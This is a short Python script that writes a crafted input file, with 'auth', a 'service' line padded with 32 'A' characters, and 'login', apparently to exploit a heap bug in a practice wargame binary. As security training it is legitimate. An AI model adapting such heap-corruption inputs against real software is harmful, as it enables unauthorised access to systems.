#!/usr/bin/python

import os

auth = "auth " + "\n"
service = "service" + 32 * "A" + "\n"
reset = "reset" + "\n"
login = "login" + "\n"
cmd = "echo \"" + auth + service + login + "\" > /tmp/input"
os.system(cmd)
